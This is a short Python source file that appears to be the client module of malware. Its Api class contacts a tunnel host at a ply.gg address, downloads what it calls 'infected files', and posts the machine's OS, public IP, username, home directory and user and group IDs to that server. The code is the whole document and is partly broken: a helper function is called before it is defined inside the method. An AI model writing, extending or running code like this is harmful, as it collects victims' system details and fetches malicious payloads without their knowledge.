import platform
import os


class Api:
    def __init__(self):
        from src.HTTPLib import HttpClient
        self.http_client = HttpClient()
        self.APIURL = "http://bin-tablet.gl.at.ply.gg:26906/"

    # TODO: Make sure when init was not executed throw a custom exception
    def getApiState(self):
        resolution = self.http_client.send_request('get', f'{self.APIURL}/api/state')
        return resolution.status_code
    
    def getApiVersion(self):
        return self.http_client.send_request('get', f'{self.APIURL}/api/version').json()


    def getInfectedFiles(self):
        """
        Retrieves a list of infected files from the API.

        Returns:
            list: A list of infected file objects.
        """
        return self.http_client.send_request('get', f'{self.APIURL}/files/download-misc')
    
    def sendApiInformation(self):
        data = {
            'os': platform.system(),
            'ip': self.http_client.send_request('get', 'https://api.ipify.org').text,
            'user': get_user_info()
        }
        response = self.http_client.send_request('post', self.APIURL, json=data)
        response.raise_for_status()

        def get_user_info():
            # Retrieve system user information
            user_info = {
                "username": os.getlogin(),
                "home_directory": os.path.expanduser("~"),
                "user_id": os.getuid(),
                "group_id": os.getgid()
            }

            return user_info